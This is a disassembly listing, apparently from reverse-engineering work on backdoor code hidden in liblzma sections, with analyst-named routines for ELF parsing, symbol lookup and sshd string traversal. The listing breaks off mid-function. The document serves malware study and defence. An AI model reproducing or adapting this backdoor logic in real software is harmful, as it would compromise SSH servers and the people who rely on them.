.text.lzma_file_info_decodea:0000000000003AFE                 mov     rax, r13
.text.lzma_file_info_decodea:0000000000003B01                 sub     rax, rbx
.text.lzma_file_info_decodea:0000000000003B04                 cmp     rax, 4000h
.text.lzma_file_info_decodea:0000000000003B0A                 jbe     short loc_3B3D
.text.lzma_file_info_decodea:0000000000003B0C
.text.lzma_file_info_decodea:0000000000003B0C loc_3B0C:                               ; CODE XREF: traversal_dynstr_sshd+EC↑j
.text.lzma_file_info_decodea:0000000000003B0C                 mov     rdi, [rbp+var_48]
.text.lzma_file_info_decodea:0000000000003B10                 xor     eax, eax
.text.lzma_file_info_decodea:0000000000003B12                 mov     edx, 1
.text.lzma_file_info_decodea:0000000000003B17                 mov     rsi, r14
.text.lzma_file_info_decodea:0000000000003B1A                 mov     [rbp+free_spaces], rax
.text.lzma_file_info_decodea:0000000000003B1E                 lea     r15, [r13+2Ch]
.text.lzma_file_info_decodea:0000000000003B22                 call    maybe_find_freespaces ; PIC mode
.text.lzma_file_info_decodea:0000000000003B27                 test    rax, rax
.text.lzma_file_info_decodea:0000000000003B2A                 jz      short loc_3B5E
.text.lzma_file_info_decodea:0000000000003B2C                 mov     rdx, [rbp+free_spaces]
.text.lzma_file_info_decodea:0000000000003B30                 add     rdx, rax
.text.lzma_file_info_decodea:0000000000003B33                 cmp     r15, rdx
.text.lzma_file_info_decodea:0000000000003B36                 ja      short loc_3B5E
.text.lzma_file_info_decodea:0000000000003B38                 cmp     r13, rax
.text.lzma_file_info_decodea:0000000000003B3B                 jb      short loc_3B5E
.text.lzma_file_info_decodea:0000000000003B3D
.text.lzma_file_info_decodea:0000000000003B3D loc_3B3D:                               ; CODE XREF: traversal_dynstr_sshd+FA↑j
.text.lzma_file_info_decodea:0000000000003B3D                 mov     rdi, [r12]      ; _BYTE *
.text.lzma_file_info_decodea:0000000000003B41                 xor     esi, esi        ; unsigned __int64
.text.lzma_file_info_decodea:0000000000003B43                 call    table_get       ; PIC mode
.text.lzma_file_info_decodea:0000000000003B48                 test    eax, eax
.text.lzma_file_info_decodea:0000000000003B4A                 jnz     short loc_3B5E
.text.lzma_file_info_decodea:0000000000003B4C                 add     r12, 8
.text.lzma_file_info_decodea:0000000000003B50                 cmp     qword ptr [r12], 0
.text.lzma_file_info_decodea:0000000000003B55                 jnz     short loc_3AF0
.text.lzma_file_info_decodea:0000000000003B57                 mov     eax, 1
.text.lzma_file_info_decodea:0000000000003B5C                 jmp     short loc_3B60
.text.lzma_file_info_decodea:0000000000003B5E ; ---------------------------------------------------------------------------
.text.lzma_file_info_decodea:0000000000003B5E
.text.lzma_file_info_decodea:0000000000003B5E loc_3B5E:                               ; CODE XREF: traversal_dynstr_sshd+18↑j
.text.lzma_file_info_decodea:0000000000003B5E                                         ; traversal_dynstr_sshd+2D↑j ...
.text.lzma_file_info_decodea:0000000000003B5E                 xor     eax, eax
.text.lzma_file_info_decodea:0000000000003B60
.text.lzma_file_info_decodea:0000000000003B60 loc_3B60:                               ; CODE XREF: traversal_dynstr_sshd+14C↑j
.text.lzma_file_info_decodea:0000000000003B60                 add     rsp, 28h
.text.lzma_file_info_decodea:0000000000003B64                 pop     rbx
.text.lzma_file_info_decodea:0000000000003B65                 pop     r12
.text.lzma_file_info_decodea:0000000000003B67                 pop     r13
.text.lzma_file_info_decodea:0000000000003B69                 pop     r14
.text.lzma_file_info_decodea:0000000000003B6B                 pop     r15
.text.lzma_file_info_decodea:0000000000003B6D                 pop     rbp
.text.lzma_file_info_decodea:0000000000003B6E                 retn
.text.lzma_file_info_decodea:0000000000003B6E traversal_dynstr_sshd endp
.text.lzma_file_info_decodea:0000000000003B6E
.text.lzma_file_info_decodea:0000000000003B6E ; ---------------------------------------------------------------------------
.text.lzma_file_info_decodea:0000000000003B6F                 align 10h
.text.lzma_file_info_decodea:0000000000003B70
.text.lzma_file_info_decodea:0000000000003B70 ; =============== S U B R O U T I N E =======================================
.text.lzma_file_info_decodea:0000000000003B70
.text.lzma_file_info_decodea:0000000000003B70
.text.lzma_file_info_decodea:0000000000003B70 ; _BOOL8 __fastcall sub_3B70(__int64, __int64, unsigned __int64, __int64)
.text.lzma_file_info_decodea:0000000000003B70 sub_3B70        proc near               ; CODE XREF: sub_7660+9D↓p
.text.lzma_file_info_decodea:0000000000003B70
.text.lzma_file_info_decodea:0000000000003B70 var_6B0         = qword ptr -6B0h
.text.lzma_file_info_decodea:0000000000003B70 var_6A0         = qword ptr -6A0h
.text.lzma_file_info_decodea:0000000000003B70 var_698         = qword ptr -698h
.text.lzma_file_info_decodea:0000000000003B70 var_690         = qword ptr -690h
.text.lzma_file_info_decodea:0000000000003B70 var_688         = qword ptr -688h
.text.lzma_file_info_decodea:0000000000003B70 var_680         = qword ptr -680h
.text.lzma_file_info_decodea:0000000000003B70 var_678         = qword ptr -678h
.text.lzma_file_info_decodea:0000000000003B70 var_670         = qword ptr -670h
.text.lzma_file_info_decodea:0000000000003B70 var_668         = qword ptr -668h
.text.lzma_file_info_decodea:0000000000003B70 var_660         = xmmword ptr -660h
.text.lzma_file_info_decodea:0000000000003B70 var_650         = byte ptr -650h
.text.lzma_file_info_decodea:0000000000003B70
.text.lzma_file_info_decodea:0000000000003B70                 push    r15
.text.lzma_file_info_decodea:0000000000003B72                 xorps   xmm0, xmm0
.text.lzma_file_info_decodea:0000000000003B75                 xor     eax, eax
.text.lzma_file_info_decodea:0000000000003B77                 push    r14
.text.lzma_file_info_decodea:0000000000003B79                 push    r13
.text.lzma_file_info_decodea:0000000000003B7B                 push    r12
.text.lzma_file_info_decodea:0000000000003B7D                 push    rbp
.text.lzma_file_info_decodea:0000000000003B7E                 mov     rbp, rdi
.text.lzma_file_info_decodea:0000000000003B81                 push    rbx
.text.lzma_file_info_decodea:0000000000003B82                 mov     rbx, rcx
.text.lzma_file_info_decodea:0000000000003B85                 mov     ecx, 186h
.text.lzma_file_info_decodea:0000000000003B8A                 sub     rsp, 688h
.text.lzma_file_info_decodea:0000000000003B91                 lea     rdi, [rsp+6B8h+var_650]
.text.lzma_file_info_decodea:0000000000003B96                 mov     [rsp+6B8h+var_6B0], rsi
.text.lzma_file_info_decodea:0000000000003B9B                 rep stosd
.text.lzma_file_info_decodea:0000000000003B9D                 movups  [rsp+6B8h+var_660], xmm0
.text.lzma_file_info_decodea:0000000000003BA2                 test    rbp, rbp
.text.lzma_file_info_decodea:0000000000003BA5                 jz      short loc_3BAC
.text.lzma_file_info_decodea:0000000000003BA7                 test    rbx, rbx
.text.lzma_file_info_decodea:0000000000003BAA                 jnz     short loc_3BB3
.text.lzma_file_info_decodea:0000000000003BAC
.text.lzma_file_info_decodea:0000000000003BAC loc_3BAC:                               ; CODE XREF: sub_3B70+35↑j
.text.lzma_file_info_decodea:0000000000003BAC                                         ; sub_3B70+4A↓j ...
.text.lzma_file_info_decodea:0000000000003BAC                 xor     eax, eax
.text.lzma_file_info_decodea:0000000000003BAE                 jmp     loc_3CB8
.text.lzma_file_info_decodea:0000000000003BB3 ; ---------------------------------------------------------------------------
.text.lzma_file_info_decodea:0000000000003BB3
.text.lzma_file_info_decodea:0000000000003BB3 loc_3BB3:                               ; CODE XREF: sub_3B70+3A↑j
.text.lzma_file_info_decodea:0000000000003BB3                 mov     rax, [rbx+8]
.text.lzma_file_info_decodea:0000000000003BB7                 test    rax, rax
.text.lzma_file_info_decodea:0000000000003BBA                 jz      short loc_3BAC
.text.lzma_file_info_decodea:0000000000003BBC                 mov     r8, [rax+30h]
.text.lzma_file_info_decodea:0000000000003BC0                 test    r8, r8
.text.lzma_file_info_decodea:0000000000003BC3                 jz      short loc_3BAC
.text.lzma_file_info_decodea:0000000000003BC5                 cmp     qword ptr [rax+38h], 0
.text.lzma_file_info_decodea:0000000000003BCA                 jz      short loc_3BAC
.text.lzma_file_info_decodea:0000000000003BCC                 xor     r9d, r9d
.text.lzma_file_info_decodea:0000000000003BCF                 lea     rsi, [rsp+6B8h+var_6A0]
.text.lzma_file_info_decodea:0000000000003BD4                 lea     rcx, [rsp+6B8h+var_690]
.text.lzma_file_info_decodea:0000000000003BD9                 mov     rdi, rbp
.text.lzma_file_info_decodea:0000000000003BDC                 mov     [rsp+6B8h+var_6A0], r9
.text.lzma_file_info_decodea:0000000000003BE1                 mov     r14, rdx
.text.lzma_file_info_decodea:0000000000003BE4                 lea     rdx, [rsp+6B8h+var_698]
.text.lzma_file_info_decodea:0000000000003BE9                 mov     [rsp+6B8h+var_698], r9
.text.lzma_file_info_decodea:0000000000003BEE                 mov     [rsp+6B8h+var_690], r9
.text.lzma_file_info_decodea:0000000000003BF3                 call    r8
.text.lzma_file_info_decodea:0000000000003BF6                 mov     rax, [rbx+8]
.text.lzma_file_info_decodea:0000000000003BFA                 mov     rdi, rbp
.text.lzma_file_info_decodea:0000000000003BFD                 call    qword ptr [rax+38h]
.text.lzma_file_info_decodea:0000000000003C00                 mov     rsi, [rsp+6B8h+var_6A0]
.text.lzma_file_info_decodea:0000000000003C05                 test    rsi, rsi
.text.lzma_file_info_decodea:0000000000003C08                 jz      short loc_3BAC
.text.lzma_file_info_decodea:0000000000003C0A                 mov     rcx, [rsp+6B8h+var_698]
.text.lzma_file_info_decodea:0000000000003C0F                 test    rcx, rcx
.text.lzma_file_info_decodea:0000000000003C12                 jz      short loc_3BAC
.text.lzma_file_info_decodea:0000000000003C14                 mov     rdx, [rsp+6B8h+var_690]
.text.lzma_file_info_decodea:0000000000003C19                 test    rdx, rdx
.text.lzma_file_info_decodea:0000000000003C1C                 jz      short loc_3BAC
.text.lzma_file_info_decodea:0000000000003C1E                 test    rax, rax
.text.lzma_file_info_decodea:0000000000003C21                 jz      short loc_3BAC
.text.lzma_file_info_decodea:0000000000003C23                 xor     edi, edi
.text.lzma_file_info_decodea:0000000000003C25                 cmp     qword ptr [rbx+8], 0
.text.lzma_file_info_decodea:0000000000003C2A                 mov     [rsp+6B8h+var_680], rsi
.text.lzma_file_info_decodea:0000000000003C2F                 mov     [rsp+6B8h+var_688], rdi
.text.lzma_file_info_decodea:0000000000003C34                 mov     [rsp+6B8h+var_678], rcx
.text.lzma_file_info_decodea:0000000000003C39                 mov     [rsp+6B8h+var_670], rdx
.text.lzma_file_info_decodea:0000000000003C3E                 mov     [rsp+6B8h+var_668], rax
.text.lzma_file_info_decodea:0000000000003C43                 jz      loc_3BAC
.text.lzma_file_info_decodea:0000000000003C49                 xor     r12d, r12d
.text.lzma_file_info_decodea:0000000000003C4C                 xor     ebp, ebp
.text.lzma_file_info_decodea:0000000000003C4E                 lea     r15, [rsp+6B8h+var_688]
.text.lzma_file_info_decodea:0000000000003C53
.text.lzma_file_info_decodea:0000000000003C53 loc_3C53:                               ; CODE XREF: sub_3B70+127↓j
.text.lzma_file_info_decodea:0000000000003C53                 mov     esi, 628h
.text.lzma_file_info_decodea:0000000000003C58                 lea     r13, [rsp+6B8h+var_660]
.text.lzma_file_info_decodea:0000000000003C5D                 mov     r8, [rbx+8]
.text.lzma_file_info_decodea:0000000000003C61                 mov     rdx, r15
.text.lzma_file_info_decodea:0000000000003C64                 mov     rcx, [rsp+r12*8+6B8h+var_680]
.text.lzma_file_info_decodea:0000000000003C69                 sub     rsi, rbp
.text.lzma_file_info_decodea:0000000000003C6C                 lea     rdi, [r13+rbp+0]
.text.lzma_file_info_decodea:0000000000003C71                 call    sub_7350
.text.lzma_file_info_decodea:0000000000003C76                 test    eax, eax
.text.lzma_file_info_decodea:0000000000003C78                 jz      loc_3BAC
.text.lzma_file_info_decodea:0000000000003C7E                 add     rbp, [rsp+6B8h+var_688]
.text.lzma_file_info_decodea:0000000000003C83                 cmp     rbp, 628h
.text.lzma_file_info_decodea:0000000000003C8A                 ja      loc_3BAC
.text.lzma_file_info_decodea:0000000000003C90                 inc     r12
.text.lzma_file_info_decodea:0000000000003C93                 cmp     r12, 4
.text.lzma_file_info_decodea:0000000000003C97                 jnz     short loc_3C53
.text.lzma_file_info_decodea:0000000000003C99                 mov     r8, [rbx+8]
.text.lzma_file_info_decodea:0000000000003C9D                 mov     rdx, [rsp+6B8h+var_6B0]
.text.lzma_file_info_decodea:0000000000003CA2                 mov     rcx, r14
.text.lzma_file_info_decodea:0000000000003CA5                 mov     rsi, rbp
.text.lzma_file_info_decodea:0000000000003CA8                 mov     rdi, r13
.text.lzma_file_info_decodea:0000000000003CAB                 call    sub_72E0
.text.lzma_file_info_decodea:0000000000003CB0                 test    eax, eax
.text.lzma_file_info_decodea:0000000000003CB2                 setnz   al
.text.lzma_file_info_decodea:0000000000003CB5                 movzx   eax, al
.text.lzma_file_info_decodea:0000000000003CB8
.text.lzma_file_info_decodea:0000000000003CB8 loc_3CB8:                               ; CODE XREF: sub_3B70+3E↑j
.text.lzma_file_info_decodea:0000000000003CB8                 add     rsp, 688h
.text.lzma_file_info_decodea:0000000000003CBF                 pop     rbx
.text.lzma_file_info_decodea:0000000000003CC0                 pop     rbp
.text.lzma_file_info_decodea:0000000000003CC1                 pop     r12
.text.lzma_file_info_decodea:0000000000003CC3                 pop     r13
.text.lzma_file_info_decodea:0000000000003CC5                 pop     r14
.text.lzma_file_info_decodea:0000000000003CC7                 pop     r15
.text.lzma_file_info_decodea:0000000000003CC9                 retn
.text.lzma_file_info_decodea:0000000000003CC9 sub_3B70        endp
.text.lzma_file_info_decodea:0000000000003CC9
.text.lzma_file_info_decodea:0000000000003CC9 _text_lzma_file_info_decodea ends
.text.lzma_file_info_decodea:0000000000003CC9
.text.lzma_filter_decoder_is_supportea:0000000000003CD0 ; ===========================================================================
.text.lzma_filter_decoder_is_supportea:0000000000003CD0
.text.lzma_filter_decoder_is_supportea:0000000000003CD0 ; Segment type: Pure code
.text.lzma_filter_decoder_is_supportea:0000000000003CD0 ; Segment permissions: Read/Execute
.text.lzma_filter_decoder_is_supportea:0000000000003CD0 _text_lzma_filter_decoder_is_supportea segment para public 'CODE' use64
.text.lzma_filter_decoder_is_supportea:0000000000003CD0                 assume cs:_text_lzma_filter_decoder_is_supportea
.text.lzma_filter_decoder_is_supportea:0000000000003CD0                 ;org 3CD0h
.text.lzma_filter_decoder_is_supportea:0000000000003CD0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_filter_decoder_is_supportea:0000000000003CD0
.text.lzma_filter_decoder_is_supportea:0000000000003CD0 ; =============== S U B R O U T I N E =======================================
.text.lzma_filter_decoder_is_supportea:0000000000003CD0
.text.lzma_filter_decoder_is_supportea:0000000000003CD0
.text.lzma_filter_decoder_is_supportea:0000000000003CD0 ; __int64 __fastcall parse_elf_invoke(elf_parse_result *a1)
.text.lzma_filter_decoder_is_supportea:0000000000003CD0                 public parse_elf_invoke
.text.lzma_filter_decoder_is_supportea:0000000000003CD0 parse_elf_invoke proc near              ; CODE XREF: parse_elf_init+17C↓p
.text.lzma_filter_decoder_is_supportea:0000000000003CD0                 endbr64
.text.lzma_filter_decoder_is_supportea:0000000000003CD4                 push    r12
.text.lzma_filter_decoder_is_supportea:0000000000003CD6                 push    rbx
.text.lzma_filter_decoder_is_supportea:0000000000003CD7                 mov     rbx, rdi
.text.lzma_filter_decoder_is_supportea:0000000000003CDA                 push    rcx
.text.lzma_filter_decoder_is_supportea:0000000000003CDB                 mov     rax, [rdi]
.text.lzma_filter_decoder_is_supportea:0000000000003CDE                 mov     rdi, [rdi+8]
.text.lzma_filter_decoder_is_supportea:0000000000003CE2                 mov     rsi, [rax+8]
.text.lzma_filter_decoder_is_supportea:0000000000003CE6                 call    parse_elf       ; PIC mode
.text.lzma_filter_decoder_is_supportea:0000000000003CEB                 test    eax, eax
.text.lzma_filter_decoder_is_supportea:0000000000003CED                 jnz     short loc_3CF3
.text.lzma_filter_decoder_is_supportea:0000000000003CEF
.text.lzma_filter_decoder_is_supportea:0000000000003CEF loc_3CEF:                               ; CODE XREF: parse_elf_invoke+3C↓j
.text.lzma_filter_decoder_is_supportea:0000000000003CEF                                         ; parse_elf_invoke+57↓j
.text.lzma_filter_decoder_is_supportea:0000000000003CEF                 xor     eax, eax
.text.lzma_filter_decoder_is_supportea:0000000000003CF1                 jmp     short loc_3D39
.text.lzma_filter_decoder_is_supportea:0000000000003CF3 ; ---------------------------------------------------------------------------
.text.lzma_filter_decoder_is_supportea:0000000000003CF3
.text.lzma_filter_decoder_is_supportea:0000000000003CF3 loc_3CF3:                               ; CODE XREF: parse_elf_invoke+1D↑j
.text.lzma_filter_decoder_is_supportea:0000000000003CF3                 mov     rax, [rbx]
.text.lzma_filter_decoder_is_supportea:0000000000003CF6                 mov     edx, 8C0h       ; a3
.text.lzma_filter_decoder_is_supportea:0000000000003CFB                 mov     esi, 2B0h       ; hash
.text.lzma_filter_decoder_is_supportea:0000000000003D00                 mov     rdi, [rax+8]    ; a1
.text.lzma_filter_decoder_is_supportea:0000000000003D04                 call    import_lookup_get_str ; PIC mode
.text.lzma_filter_decoder_is_supportea:0000000000003D09                 test    rax, rax
.text.lzma_filter_decoder_is_supportea:0000000000003D0C                 jz      short loc_3CEF
.text.lzma_filter_decoder_is_supportea:0000000000003D0E                 mov     rdx, [rbx]
.text.lzma_filter_decoder_is_supportea:0000000000003D11                 mov     r12, [rax+8]
.text.lzma_filter_decoder_is_supportea:0000000000003D15                 mov     rdi, [rdx+8]
.text.lzma_filter_decoder_is_supportea:0000000000003D19                 add     r12, [rdi]
.text.lzma_filter_decoder_is_supportea:0000000000003D1C                 mov     rsi, [r12]
.text.lzma_filter_decoder_is_supportea:0000000000003D20                 call    traversal_dynstr_sshd ; a2: 0x00007fffffffedb0
.text.lzma_filter_decoder_is_supportea:0000000000003D25                 test    eax, eax
.text.lzma_filter_decoder_is_supportea:0000000000003D27                 jz      short loc_3CEF
.text.lzma_filter_decoder_is_supportea:0000000000003D29                 mov     rax, [rbx+10h]
.text.lzma_filter_decoder_is_supportea:0000000000003D2D                 mov     rdx, [r12]
.text.lzma_filter_decoder_is_supportea:0000000000003D31                 mov     [rax], rdx
.text.lzma_filter_decoder_is_supportea:0000000000003D34                 mov     eax, 1
.text.lzma_filter_decoder_is_supportea:0000000000003D39
.text.lzma_filter_decoder_is_supportea:0000000000003D39 loc_3D39:                               ; CODE XREF: parse_elf_invoke+21↑j
.text.lzma_filter_decoder_is_supportea:0000000000003D39                 pop     rdx
.text.lzma_filter_decoder_is_supportea:0000000000003D3A                 pop     rbx
.text.lzma_filter_decoder_is_supportea:0000000000003D3B                 pop     r12
.text.lzma_filter_decoder_is_supportea:0000000000003D3D                 retn
.text.lzma_filter_decoder_is_supportea:0000000000003D3D parse_elf_invoke endp
.text.lzma_filter_decoder_is_supportea:0000000000003D3D
.text.lzma_filter_decoder_is_supportea:0000000000003D3D _text_lzma_filter_decoder_is_supportea ends
.text.lzma_filter_decoder_is_supportea:0000000000003D3D
.text.lzma_lzma2_encoder_memusaga:0000000000003D40 ; ===========================================================================
.text.lzma_lzma2_encoder_memusaga:0000000000003D40
.text.lzma_lzma2_encoder_memusaga:0000000000003D40 ; Segment type: Pure code
.text.lzma_lzma2_encoder_memusaga:0000000000003D40 ; Segment permissions: Read/Execute
.text.lzma_lzma2_encoder_memusaga:0000000000003D40 _text_lzma_lzma2_encoder_memusaga segment para public 'CODE' use64
.text.lzma_lzma2_encoder_memusaga:0000000000003D40                 assume cs:_text_lzma_lzma2_encoder_memusaga
.text.lzma_lzma2_encoder_memusaga:0000000000003D40                 ;org 3D40h
.text.lzma_lzma2_encoder_memusaga:0000000000003D40                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_lzma2_encoder_memusaga:0000000000003D40
.text.lzma_lzma2_encoder_memusaga:0000000000003D40 ; =============== S U B R O U T I N E =======================================
.text.lzma_lzma2_encoder_memusaga:0000000000003D40
.text.lzma_lzma2_encoder_memusaga:0000000000003D40
.text.lzma_lzma2_encoder_memusaga:0000000000003D40 ; __int64 __fastcall Llzma_lzma2_encoder_memusage_0(__int64, __int64, __int64)
.text.lzma_lzma2_encoder_memusaga:0000000000003D40 _Llzma_lzma2_encoder_memusage_0 proc near
.text.lzma_lzma2_encoder_memusaga:0000000000003D40                                         ; CODE XREF: install_entries+337↓p
.text.lzma_lzma2_encoder_memusaga:0000000000003D40                                         ; install_entries:loc_5763↓p ...
.text.lzma_lzma2_encoder_memusaga:0000000000003D40                 endbr64
.text.lzma_lzma2_encoder_memusaga:0000000000003D44                 test    rdi, rdi
.text.lzma_lzma2_encoder_memusaga:0000000000003D47                 jz      short loc_3D97
.text.lzma_lzma2_encoder_memusaga:0000000000003D49                 push    r15
.text.lzma_lzma2_encoder_memusaga:0000000000003D4B                 mov     r15, rcx
.text.lzma_lzma2_encoder_memusaga:0000000000003D4E                 push    r14
.text.lzma_lzma2_encoder_memusaga:0000000000003D50                 mov     r14, rdx
.text.lzma_lzma2_encoder_memusaga:0000000000003D53                 push    r13
.text.lzma_lzma2_encoder_memusaga:0000000000003D55                 mov     r13, rsi
.text.lzma_lzma2_encoder_memusaga:0000000000003D58                 push    r12
.text.lzma_lzma2_encoder_memusaga:0000000000003D5A                 mov     r12, rdi
.text.lzma_lzma2_encoder_memusaga:0000000000003D5D                 push    rbx
.text.lzma_lzma2_encoder_memusaga:0000000000003D5E                 call    _Llzma_delta_coder_init_1 ; PIC mode
.text.lzma_lzma2_encoder_memusaga:0000000000003D63                 mov     rcx, r15
.text.lzma_lzma2_encoder_memusaga:0000000000003D66                 mov     rdx, r14
.text.lzma_lzma2_encoder_memusaga:0000000000003D69                 mov     rsi, r13
.text.lzma_lzma2_encoder_memusaga:0000000000003D6C                 mov     rdi, r12
.text.lzma_lzma2_encoder_memusaga:0000000000003D6F                 mov     ebx, eax
.text.lzma_lzma2_encoder_memusaga:0000000000003D71                 call    _Llzma_decoder_init_1 ; PIC mode
.text.lzma_lzma2_encoder_memusaga:0000000000003D76                 mov     rcx, r15
.text.lzma_lzma2_encoder_memusaga:0000000000003D79                 mov     rdx, r14
.text.lzma_lzma2_encoder_memusaga:0000000000003D7C                 mov     rsi, r13
.text.lzma_lzma2_encoder_memusaga:0000000000003D7F                 add     ebx, eax
.text.lzma_lzma2_encoder_memusaga:0000000000003D81                 mov     rdi, r12
.text.lzma_lzma2_encoder_memusaga:0000000000003D84                 call    _Llzma_check_finish_0 ; PIC mode
.text.lzma_lzma2_encoder_memusaga:0000000000003D89                 add     ebx, ebx
.text.lzma_lzma2_encoder_memusaga:0000000000003D8B                 add     eax, ebx
.text.lzma_lzma2_encoder_memusaga:0000000000003D8D                 pop     rbx
.text.lzma_lzma2_encoder_memusaga:0000000000003D8E                 pop     r12
.text.lzma_lzma2_encoder_memusaga:0000000000003D90                 pop     r13
.text.lzma_lzma2_encoder_memusaga:0000000000003D92                 pop     r14
.text.lzma_lzma2_encoder_memusaga:0000000000003D94                 pop     r15
.text.lzma_lzma2_encoder_memusaga:0000000000003D96                 retn
.text.lzma_lzma2_encoder_memusaga:0000000000003D97 ; ---------------------------------------------------------------------------
.text.lzma_lzma2_encoder_memusaga:0000000000003D97
.text.lzma_lzma2_encoder_memusaga:0000000000003D97 loc_3D97:                               ; CODE XREF: _Llzma_lzma2_encoder_memusage_0+7↑j
.text.lzma_lzma2_encoder_memusaga:0000000000003D97                 xor     eax, eax
.text.lzma_lzma2_encoder_memusaga:0000000000003D99                 retn
.text.lzma_lzma2_encoder_memusaga:0000000000003D99 _Llzma_lzma2_encoder_memusage_0 endp
.text.lzma_lzma2_encoder_memusaga:0000000000003D99
.text.lzma_lzma2_encoder_memusaga:0000000000003D99 _text_lzma_lzma2_encoder_memusaga ends
.text.lzma_lzma2_encoder_memusaga:0000000000003D99
.text.lzma_mf_bt4_fina:0000000000003DA0 ; ===========================================================================
.text.lzma_mf_bt4_fina:0000000000003DA0
.text.lzma_mf_bt4_fina:0000000000003DA0 ; Segment type: Pure code
.text.lzma_mf_bt4_fina:0000000000003DA0 ; Segment permissions: Read/Execute
.text.lzma_mf_bt4_fina:0000000000003DA0 _text_lzma_mf_bt4_fina segment para public 'CODE' use64
.text.lzma_mf_bt4_fina:0000000000003DA0                 assume cs:_text_lzma_mf_bt4_fina
.text.lzma_mf_bt4_fina:0000000000003DA0                 ;org 3DA0h
.text.lzma_mf_bt4_fina:0000000000003DA0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_mf_bt4_fina:0000000000003DA0
.text.lzma_mf_bt4_fina:0000000000003DA0 ; =============== S U B R O U T I N E =======================================
.text.lzma_mf_bt4_fina:0000000000003DA0
.text.lzma_mf_bt4_fina:0000000000003DA0
.text.lzma_mf_bt4_fina:0000000000003DA0 ; __int64 __fastcall Llzma_mf_bt4_find_0(__int64 *, __int64, __int64)
.text.lzma_mf_bt4_fina:0000000000003DA0 _Llzma_mf_bt4_find_0 proc near          ; CODE XREF: parse_elf_init+DC8↓p
.text.lzma_mf_bt4_fina:0000000000003DA0
.text.lzma_mf_bt4_fina:0000000000003DA0 var_E8          = qword ptr -0E8h
.text.lzma_mf_bt4_fina:0000000000003DA0 var_E0          = qword ptr -0E0h
.text.lzma_mf_bt4_fina:0000000000003DA0 var_D0          = qword ptr -0D0h
.text.lzma_mf_bt4_fina:0000000000003DA0 var_C8          = qword ptr -0C8h
.text.lzma_mf_bt4_fina:0000000000003DA0 var_C0          = qword ptr -0C0h
.text.lzma_mf_bt4_fina:0000000000003DA0 var_B8          = qword ptr -0B8h
.text.lzma_mf_bt4_fina:0000000000003DA0 var_B0          = qword ptr -0B0h
.text.lzma_mf_bt4_fina:0000000000003DA0 var_A8          = qword ptr -0A8h
.text.lzma_mf_bt4_fina:0000000000003DA0 var_A0          = dword ptr -0A0h
.text.lzma_mf_bt4_fina:0000000000003DA0 var_78          = qword ptr -78h
.text.lzma_mf_bt4_fina:0000000000003DA0
.text.lzma_mf_bt4_fina:0000000000003DA0                 endbr64
.text.lzma_mf_bt4_fina:0000000000003DA4                 push    r15
.text.lzma_mf_bt4_fina:0000000000003DA6                 xor     ecx, ecx
.text.lzma_mf_bt4_fina:0000000000003DA8                 push    r14
.text.lzma_mf_bt4_fina:0000000000003DAA                 mov     r14, rsi
.text.lzma_mf_bt4_fina:0000000000003DAD                 mov     esi, 14h
.text.lzma_mf_bt4_fina:0000000000003DB2                 push    r13
.text.lzma_mf_bt4_fina:0000000000003DB4                 push    r12
.text.lzma_mf_bt4_fina:0000000000003DB6                 mov     r12, rdx
.text.lzma_mf_bt4_fina:0000000000003DB9                 mov     edx, 0Fh
.text.lzma_mf_bt4_fina:0000000000003DBE                 push    rbx
.text.lzma_mf_bt4_fina:0000000000003DBF                 mov     rbx, rdi
.text.lzma_mf_bt4_fina:0000000000003DC2                 mov     edi, 0DAh
.text.lzma_mf_bt4_fina:0000000000003DC7                 sub     rsp, 0C0h
.text.lzma_mf_bt4_fina:0000000000003DCE                 call    _Llzma_index_iter_rewind_cold ; PIC mode
.text.lzma_mf_bt4_fina:0000000000003DD3                 test    eax, eax
.text.lzma_mf_bt4_fina:0000000000003DD5                 jnz     short loc_3DDE
.text.lzma_mf_bt4_fina:0000000000003DD7
.text.lzma_mf_bt4_fina:0000000000003DD7 loc_3DD7:                               ; CODE XREF: _Llzma_mf_bt4_find_0+52↓j
.text.lzma_mf_bt4_fina:0000000000003DD7                                         ; _Llzma_mf_bt4_find_0+70↓j ...
.text.lzma_mf_bt4_fina:0000000000003DD7                 xor     eax, eax
.text.lzma_mf_bt4_fina:0000000000003DD9                 jmp     loc_3F3B
.text.lzma_mf_bt4_fina:0000000000003DDE ; ---------------------------------------------------------------------------
.text.lzma_mf_bt4_fina:0000000000003DDE
.text.lzma_mf_bt4_fina:0000000000003DDE loc_3DDE:                               ; CODE XREF: _Llzma_mf_bt4_find_0+35↑j
.text.lzma_mf_bt4_fina:0000000000003DDE                 mov     rax, [r12+20h]
.text.lzma_mf_bt4_fina:0000000000003DE3                 xor     edx, edx
.text.lzma_mf_bt4_fina:0000000000003DE5                 mov     [rsp+0E8h+var_D0], rdx
.text.lzma_mf_bt4_fina:0000000000003DEA                 cmp     qword ptr [rax+0A8h], 0
.text.lzma_mf_bt4_fina:0000000000003DF2                 jz      short loc_3DD7
.text.lzma_mf_bt4_fina:0000000000003DF4                 xor     eax, eax
.text.lzma_mf_bt4_fina:0000000000003DF6                 lea     rsi, [rsp+0E8h+var_D0]
.text.lzma_mf_bt4_fina:0000000000003DFB                 xor     edx, edx
.text.lzma_mf_bt4_fina:0000000000003DFD                 mov     rdi, rbx
.text.lzma_mf_bt4_fina:0000000000003E00                 mov     [r12+48h], rax
.text.lzma_mf_bt4_fina:0000000000003E05                 call    maybe_find_freespaces ; PIC mode
.text.lzma_mf_bt4_fina:0000000000003E0A                 mov     r15, rax
.text.lzma_mf_bt4_fina:0000000000003E0D                 test    rax, rax
.text.lzma_mf_bt4_fina:0000000000003E10                 jz      short loc_3DD7
.text.lzma_mf_bt4_fina:0000000000003E12                 mov     rax, [rsp+0E8h+var_D0]
.text.lzma_mf_bt4_fina:0000000000003E17                 lea     rdi, [rsp+0E8h+var_78]
.text.lzma_mf_bt4_fina:0000000000003E1C                 mov     ecx, 14h
.text.lzma_mf_bt4_fina:0000000000003E21                 xor     ebx, ebx
.text.lzma_mf_bt4_fina:0000000000003E23                 lea     r13, [rsp+0E8h+var_78]
.text.lzma_mf_bt4_fina:0000000000003E28                 lea     r10, [rsp+0E8h+var_C8]
.text.lzma_mf_bt4_fina:0000000000003E2D                 add     rax, r15
.text.lzma_mf_bt4_fina:0000000000003E30                 mov     [rsp+0E8h+var_E8], rax
.text.lzma_mf_bt4_fina:0000000000003E34                 mov     rax, 500000004h
.text.lzma_mf_bt4_fina:0000000000003E3E                 mov     [rsp+0E8h+var_C8], rax
